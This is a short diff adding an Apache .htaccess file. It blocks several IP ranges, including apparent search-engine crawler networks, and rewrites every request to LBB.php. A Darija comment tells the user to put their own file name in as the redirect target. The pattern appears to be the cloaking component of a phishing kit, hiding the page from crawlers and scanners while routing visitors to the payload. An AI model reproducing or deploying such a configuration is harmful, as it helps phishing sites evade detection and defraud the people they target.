@@ -1,0 +1,20 @@
+# BAN USER BY IP
+<Limit GET POST>
+ order allow,deny
+ allow from all
+ deny from 92.103.69.xxx
+ deny from 207.46.13.xxx
+ deny from 66.102.xxx.xxx
+ deny from unknown
+ deny from 145.226.xxx.xxx
+ deny from 66.249.84.xxx
+ deny from 64.125.xxx.xxx
+ deny from 37.187.53.190
+ deny from 66.249.84.214
+ deny from 66.249.84.148
+ deny from 66.249.xxx.xxx
+ deny from 84.14.214.213
+</Limit>
+#comment : ila badelti smia d redirection badel smia li lta7t red3.php b smia d fichier dialk
+RewriteEngine On
+RewriteRule ^(.*)$ LBB.php
